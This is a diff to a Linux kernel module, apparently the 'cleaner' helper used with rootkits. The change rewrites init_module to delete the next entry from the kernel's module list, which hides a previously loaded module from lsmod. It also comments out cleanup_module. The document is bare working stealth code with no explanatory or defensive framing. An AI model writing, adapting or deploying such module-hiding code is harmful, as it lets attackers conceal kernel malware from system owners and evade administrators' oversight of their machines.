@@ -29,9 +29,12 @@
  * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
  * SUCH DAMAGE.
  */
-
+#ifndef __KERNEL__
 #define __KERNEL__
+#endif
+#ifndef MODULE
 #define MODULE
+#endif
 
 #ifdef MODVERSIONS
 #include <linux/modversions.h>
@@ -40,19 +43,20 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/string.h>
-
+struct list_head * head;
 int init_module()
 {
-	if (__this_module.next)
-		__this_module.next = __this_module.next->next;
+    head=&(__this_module.list);
+	if (!list_empty(head))
+		list_del(head->next);
 
 	return 0;
 }
-
+/*
 int cleanup_module()
 {
 	return 0;
 }
-
+*/
 MODULE_LICENSE("GPL");
 
